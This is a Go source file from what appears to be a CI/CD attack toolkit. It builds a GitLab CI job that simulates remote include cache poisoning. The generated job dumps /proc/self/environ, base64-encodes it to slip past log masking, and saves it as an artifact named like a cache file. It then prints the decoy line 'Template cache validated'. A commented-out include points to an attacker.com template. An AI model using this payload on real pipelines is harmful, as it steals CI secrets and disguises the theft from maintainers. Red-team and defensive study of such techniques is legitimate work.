package payloads

import "fmt"

// RemoteIncludeCacheOptions configures a remote include cache poisoning payload.
type RemoteIncludeCacheOptions struct {
	Common       CommonOptions
	RemoteURL    string // attacker-controlled URL
	CacheTTL     string // cache duration (default: "1h")
	PoisonedYAML string // malicious YAML content served at URL
	CallbackURL  string
}

// GenerateRemoteIncludeCacheYAML generates a CI config that demonstrates remote
// include cache poisoning. The include directive is commented out (it would point
// to an attacker-controlled server) and the job exfiltrates env via base64-encoded
// /proc/self/environ to simulate what a poisoned cached template would do.
func GenerateRemoteIncludeCacheYAML(o RemoteIncludeCacheOptions) string {
	name, stage := o.Common.defaults("cache-seed")
	if o.RemoteURL == "" {
		o.RemoteURL = "https://attacker.com/ci-template.yml"
	}
	if o.CacheTTL == "" {
		o.CacheTTL = "1h"
	}

	return fmt.Sprintf(`# Remote include cache poisoning (GitLab 19.0+)
# In a real attack, the following include would cache poisoned CI config:
#   include:
#     - remote: %s
#       cache: "%s"
# This payload simulates what the cached poisoned template would execute.

stages: [%s]

%s:
  stage: %s%s%s
  script:
    - |
      # Simulates poisoned cached template execution
      # Exfil via base64-encoded /proc/self/environ (bypasses log masking)
      cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | base64 -w0 > .template-cache.b64 || true
      echo "Template cache validated"
  artifacts:
    when: always
    paths:
      - .template-cache.b64
    expire_in: 1 day
  allow_failure: true%s
`, o.RemoteURL, o.CacheTTL, stage, name, stage,
		imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		rulesManual(o.Common.Manual))
}
